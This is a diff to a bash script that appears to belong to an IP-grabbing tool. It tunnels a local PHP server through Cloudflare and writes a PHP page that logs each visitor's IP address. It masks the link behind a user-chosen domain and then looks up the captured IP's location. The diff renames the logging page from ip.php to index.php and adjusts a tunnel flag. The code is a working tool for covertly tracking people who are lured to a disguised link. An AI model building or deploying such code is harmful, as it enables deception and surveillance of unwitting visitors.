@@ -40,7 +40,7 @@ ini_cloud(){
     if [[ $(command -v termux-chroot) ]]; then
         sleep 2 && termux-chroot ./cloudflared tunnel -url "$host":"$port" --logfile .cld.log > /dev/null 2>&1 &
     else
-       sleep 2 && ./cloudflared tunnel --url "$host":"$port" --logfile .cld.log > /dev/null 2>&1 &
+       sleep 2 && ./cloudflared tunnel -url "$host":"$port" --logfile .cld.log > /dev/null 2>&1 &
     fi
     sleep 10
     fkurl=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" ".cld.log")
@@ -51,7 +51,7 @@ ini_cloud(){
 make_php(){
     url=$1
 
-    cat <<EOF > ip.php
+    cat <<EOF > index.php
     <?php
     if (isset(\$_SERVER['HTTP_CLIENT_IP'])) {
         \$ip_address = \$_SERVER['HTTP_CLIENT_IP'];
@@ -113,7 +113,7 @@ if [[ "$msk" != http://* ]] || [[ "$msk" != https://* ]]; then
     msk="https://$msk.com"
 fi
 
-cd .server && rm -f ip.php
+cd .server && rm -f index.php
 make_php "$msk"
 ini_cloud
 cd "$loc"
@@ -124,7 +124,7 @@ echo "$new_url"
 
 echo "[-] Info: "
 while true; do
-    if [[ -e ".server/ip.php" ]]; then
+    if [[ -e ".server/index.php" ]]; then
         ip=$(cat .server/ip.txt)
         get_info "$ip"
         echo -e "\n\n"
